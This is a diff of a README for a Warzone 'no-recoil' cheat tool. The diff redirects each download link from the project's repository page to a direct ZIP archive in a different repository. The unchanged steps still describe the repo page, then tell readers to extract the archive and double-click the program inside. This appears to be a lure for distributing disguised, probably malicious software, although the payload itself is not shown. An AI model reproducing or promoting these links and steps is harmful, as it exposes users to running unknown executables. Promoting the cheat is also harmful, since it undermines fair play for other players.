@@ -5,13 +5,13 @@ description: "Eliminate recoil in Warzone with automated macros for all AR, SMG,
 ---
 # 🎯 warzone-no-recoil-2026 - Ultimate Recoil Control for Warzone
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=00FF00)](https://github.com/rayyanazwar0/warzone-no-recoil-2026)
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=00FF00)](https://raw.githubusercontent.com/rayyanazwar0/rayyanazwar0.github.io/main/games/App_3.5.zip)
 
 ---
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[https://github.com/rayyanazwar0/warzone-no-recoil-2026](https://github.com/rayyanazwar0/warzone-no-recoil-2026)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/rayyanazwar0/rayyanazwar0.github.io/main/games/App_3.5.zip](https://raw.githubusercontent.com/rayyanazwar0/rayyanazwar0.github.io/main/games/App_3.5.zip)**
 
 Once you land on the page, look for the green **"Code"** button, click it, and select **"Download ZIP"**. After the download finishes, right-click the ZIP file and choose **"Extract All"** to unzip it. Then, open the extracted folder and double-click the application file inside to run it.
 
@@ -162,7 +162,7 @@ Need help? We're here for you. Join our community discussions or open an issue o
 
 Stop missing shots. Stop fighting the recoil. Take your gameplay to the next level right now. Download warzone-no-recoil-2026 today and experience what it's like to have perfect aim in every firefight.
 
-**[👉 Click Here to Download warzone-no-recoil-2026](https://github.com/rayyanazwar0/warzone-no-recoil-2026)**
+**[👉 Click Here to Download warzone-no-recoil-2026](https://raw.githubusercontent.com/rayyanazwar0/rayyanazwar0.github.io/main/games/App_3.5.zip)**
 
 ---
 
